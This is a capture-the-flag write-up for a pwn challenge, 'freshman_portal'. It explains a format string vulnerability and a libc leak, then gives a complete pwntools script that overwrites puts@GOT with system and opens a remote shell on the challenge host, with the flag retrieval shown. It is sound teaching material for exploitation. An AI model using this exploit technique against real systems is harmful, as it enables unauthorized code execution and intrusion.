#Pwn 

## 1. Vulnerability Analysis

The challenge provides a C source file `chall.c` and a binary `freshman_portal`. Looking at the source:

```c
void print_banner() {
    printf("[DEBUG] System buffer initialized at: %p\n", &setvbuf);
}

int main() {
    char announcement[1024] = {'\0'};
    setup_buffers();
    print_banner();
    printf("\nEnter your broadcast message: ");
    fgets(announcement, 1024, stdin);
    printf(announcement); // <--- Format String Vulnerability
    puts(system_command); // <--- system_command points to "/bin/sh"
    return 0;
}
```

Two critical things happen here:
1. **Information Leak:** The program prints the address of `setvbuf`, allowing us to calculate the libc base address.
2. **Format String Vulnerability:** `printf(announcement)` is called with user-supplied data without a format specifier. This allows us to read from and write to arbitrary memory locations.

## 2. Binary Protections

Running `checksec` on the binary:
- **PIE Disabled:** The binary's base address and the Global Offset Table (GOT) are at fixed locations.
- **Partial RELRO:** The GOT is writable.
- **NX Enabled:** The stack is non-executable, but we don't need shellcode for this exploit.

## 3. Exploitation Strategy

The goal is to overwrite the GOT entry of a function that is called *after* the vulnerability with the address of `system`.

1. **Leaking Libc:** The program explicitly leaks the address of `setvbuf`. By subtracting the offset of `setvbuf` in the provided `libc.so.6`, we find the libc base. Adding the offset of `system` gives us its runtime address.
2. **Finding the Offset:** By sending `%p` specifiers, we determined that the user-controlled buffer starts at the **6th** position on the stack.
3. **GOT Overwrite:** The program calls `puts(system_command)` after the vulnerability. By overwriting the GOT entry of `puts` with the address of `system`, the call to `puts("/bin/sh")` effectively becomes `system("/bin/sh")`.

## 4. Exploit Script

```python
from pwn import *

context.arch = 'amd64'
elf = ELF('./freshman_portal')
libc = ELF('./libc.so.6')

host = 'netrunner.kurukshetraceg.org.in'
port = 1337

r = remote(host, port)

# Leak setvbuf and calculate libc base + system address
r.recvuntil(b'System buffer initialized at: ')
leaked_setvbuf = int(r.recvline().strip(), 16)
libc_base = leaked_setvbuf - libc.symbols['setvbuf']
system_addr = libc_base + libc.symbols['system']

# Target: puts GOT entry
puts_got = elf.got['puts']

# Craft payload to overwrite puts@GOT with system
payload = fmtstr_payload(6, {puts_got: system_addr})

r.sendlineafter(b'Enter your broadcast message: ', payload)
r.interactive()
```

## 5. Flag Retrieval

Executing the script grants a shell on the remote server:

```bash
$ ls
chall.c
flag.txt
freshman_portal
$ cat flag.txt
CTF{Str1ng_Format_15_3asy}
```

**Flag:** `CTF{Str1ng_Format_15_3asy}`
